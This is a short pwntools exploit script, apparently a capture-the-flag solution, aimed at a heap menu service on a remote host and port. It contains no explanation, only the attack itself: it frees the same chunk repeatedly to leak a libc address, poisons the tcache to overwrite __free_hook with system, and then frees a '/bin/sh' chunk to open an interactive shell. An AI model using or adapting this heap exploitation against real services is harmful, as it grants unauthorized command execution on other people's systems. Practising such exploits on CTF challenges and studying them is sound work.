from pwn import *
def cmd(c):
	p.sendlineafter("=\n\n",str(c))
def add(data):
	cmd(1)
	p.sendafter(">\n",data)
def free(idx):
	cmd(2)
	p.sendlineafter(">",str(idx))
def show(idx):
	cmd(3)
	p.sendlineafter(">",str(idx))
#context.log_level='debug'
#p=process("./main")
p=remote("10.21.13.190",2599)
add("A")
add("B")
for x in range(7):
	free(1)
free(0)
show(0)
base=u64(p.readuntil("=")[:-1])-(0xa0a7ffff7dcfca0-0x00007ffff79e4000)
libc=ELF("./libc-2.27.so")
libc.address=base
log.warning(hex(base))

add(p64(libc.symbols['__free_hook']-8))#2
add("/bin/sh")
#raw_input()
one=libc.symbols['system']
add(p64(one)*2)

free(3)

#gdb.attach(p)
p.interactive()
